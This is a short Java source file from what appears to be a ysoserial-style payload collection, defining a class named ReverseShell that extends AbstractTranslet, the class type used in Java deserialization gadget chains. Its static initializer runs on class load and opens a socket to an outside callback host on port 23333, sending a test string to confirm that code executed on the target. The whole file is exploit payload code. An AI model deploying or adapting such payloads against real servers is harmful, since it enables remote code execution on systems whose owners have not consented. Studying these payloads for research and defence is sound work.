package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;
import java.net.Socket;

/**
 * @author threedr3am
 */
public class ReverseShell extends AbstractTranslet {

  static {
      try {
          Socket socket = new Socket("rw.yqzf33.ceye.io", 23333);
          socket.getOutputStream().write("test".getBytes());
          socket.close();
      } catch (IOException e) {
          e.printStackTrace();
      }
  }

  @Override
  public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

  }

  @Override
  public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
      throws TransletException {

  }
}
